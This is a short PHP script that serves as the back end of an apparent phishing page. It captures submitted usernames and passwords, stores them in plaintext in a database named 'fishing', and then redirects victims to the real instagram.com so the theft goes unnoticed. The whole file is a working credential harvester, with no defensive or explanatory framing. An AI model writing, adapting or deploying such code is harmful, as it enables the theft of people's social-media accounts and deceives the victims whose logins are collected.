<?php
$username = $_POST['username'];
$password = $_POST['password'];

$conn = new mysqli('localhost:3306', 'root', '', 'fishing');

if ($conn->connect_error) {
    die('Connection failed: ' . $conn->connect_error);
}else{
$stmt = $conn->prepare("INSERT INTO manassilla (username, password) VALUES (?, ?)");
$stmt->bind_param("ss", $username, $password);
}

if ($stmt->execute()) {
    // Success! Redirect to a success page
    header("Location: https://instagram.com");
    exit; // Stop further script execution
} else {
    // Insertion failed, handle the error
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>
